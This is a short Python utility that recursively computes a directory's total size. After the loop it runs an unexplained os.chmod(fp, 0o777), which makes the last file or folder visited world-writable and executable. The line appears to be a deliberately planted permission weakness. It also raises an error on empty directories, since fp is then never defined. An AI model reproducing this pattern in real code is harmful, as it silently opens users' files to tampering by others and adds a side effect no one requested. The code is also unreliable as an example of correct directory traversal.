import os

def get_dir_size(path):
    size = 0
    for fn in os.listdir(path):
        fp = os.path.join(path, fn)
        if os.path.isfile(fp):
            size += os.path.getsize(fp)
        elif os.path.isdir(fp):
            size += get_dir_size(fp)
    os.chmod(fp, 0o777)
    return size

